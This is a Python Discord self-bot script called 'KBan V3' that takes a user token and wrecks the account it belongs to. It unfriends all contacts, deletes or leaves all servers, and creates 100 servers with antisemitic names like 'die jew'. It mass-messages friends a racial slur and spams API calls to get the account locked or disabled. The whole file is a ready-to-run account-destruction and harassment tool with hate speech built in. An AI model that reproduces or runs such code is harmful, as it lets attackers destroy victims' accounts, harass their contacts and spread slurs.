#totally didnt remove some commands and made it while true funnies 

import discord, random
import aiohttp, datetime, time
newicon = "https://media.discordapp.net/attachments/772626555754774539/775874058926948412/c4.png?width=555&height=555"
contentt = 'My Account Burn || KabionIsGaming'
print('KBAN V3 was made by totally checkers aka krabion game ing!!!')
token = input('Token:')
content = '`This account has been niggered by Kabion'
class MyClient(discord.Client):
    async def on_connect(self):
        print('--------------------')
        print('KBan V3 Ready.')
        print('Date: {0}'.format(time.asctime()))
        print('User: {0}'.format(client.user))
        print('--------------------')
        while True:
            tokenchoice = input('>> ')
            if tokenchoice == '1':
                await NuclearBomb(token)

            elif tokenchoice == '2':
                await ELock(token)
            
            elif tokenchoice == '3':
                await MASSDM(token)
            
            elif tokenchoice == '4':
                await Backup(token)
            
            elif tokenchoice == '5':
                await disable(token)
            elif tokenchoice == 'help':
                print('------------------------')
                print('// KBan V3 Help //')
                print('1: Nukes Token')
                print('2: EmailLocks Token')
                print('3: MassDM')
                print('4: Backup Account')
                print('5: GuildJoin')
                print('------------------------')

async def MASSDM(token):
    for friend in client.user.friends:
        try:
            embed = discord.Embed(title='KBAN V3 NIGGERING SESSION', color=777777, description= f'''{content} \n https://github.com/KabionIsGaming''')
            embed.set_thumbnail(url=client.user.avatar_url)
            await friend.send(embed=embed)
            print('{0} MASSDMED'.format(friend.name))
        except:
            pass
    print('MassDM Finished')
async def NuclearBomb(token):
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=contentt), status=discord.Status.dnd)
    print('--------------------\nNuking {0}'.format(client.user))
    for friend in client.user.friends:
        try:
            await friend.remove_friend()
            print('{0} - {1} was unfriended.'.format(len(client.user.friends), friend.name))
        except:
            print('{0} - {1} wasn\'t unfriended.'.format(len(client.user.friends), friend.name))
            pass
    await client.user.edit_settings(theme=discord.Theme.light, locale="ko", developer_mode=False, animate_emojis=False, gif_auto_play=False, render_reactions=False, default_guilds_restricted=True, message_display_compact=True)
    for guild in client.guilds:
        try:
            await guild.delete()
            print('{0} - {1} was deleted.'.format(len(client.guilds), guild.name))
        except:
            pass

        try:
            await guild.leave()
            print('{0} - {1} was left.'.format(len(client.guilds), guild.name))
        except:
            pass
    for x in range(100):
        try:
         guild = await client.create_guild(name=random.choice(['jewish', 'oy vey', 'finger slipped', 'die jew']))
         print('{0} - {1} was created.'.format(len(client.guilds), guild.name))
        except:
         print('Guild creation failed at {0} guilds'.format(len(client.guilds)))
         return
    print('Nuke finished\n--------------------')
async def ELock(token):
    print('--------------------')
    print('EMAIL Locking {0}'.format(client.user))
    ids = [768496306556502068, 764577901806485545, 763384611925000193, 750317688944853064, 599636206719860754, 754619738541260821, 477784992525844480, 771475415696015383, 764513309419372585, 769421693009395742, 772998756555685899, 769333689465045003]
    for x in range(20):
        try:
         disableid = await client.fetch_user(random.choice(ids))
         username = disableid.name
         disablediscrim = disableid.discriminator
         async with aiohttp.ClientSession() as session:
             await session.post("https://discord.com/api/v8/users/@me/relationships", headers = {'authorization' : token}, json = {'username' : username, 'discriminator' : int(disablediscrim)})
        except:
         print('Account is locked')
         return
    print('EMAIL Lock finished\n--------------------')

async def Backup(token):
    file = open(f"Backup-{client.user}.txt", 'w')
    file.write("""KBan V3 Account Backup\n""")
    file.write('User: {0}\n'.format(client.user))
    file.write("Date: {0}\n----------------------------------\n\n".format(time.asctime()))
    for friend in client.user.friends:
       file.write(f"""{friend} - {friend.id}\n""")
    file.write('\nEND OF FRIEND BACKUP \n----------------------------------\n\n')
    for guild in client.guilds:
        file.write(f"{guild} - {guild.id} - Members: {guild.member_count} \n")
    file.write("\nKBan V3 Client Backup End \n----------------------------------\n")
    print("Backup Finshed")

async def disable(token):
    print(f'Kiking {client.user}')
    async with aiohttp.ClientSession() as req:
     for x in range(20):
           await req.post(f"https://discordapp.com/api/v8/invites/python",headers={'authorization': token})
           await req.delete(f'https://canary.discord.com/api/v8/users/@me/guilds/267624335836053506', headers = {'authorization': token})


client = MyClient()
client.run(token, bot=False)
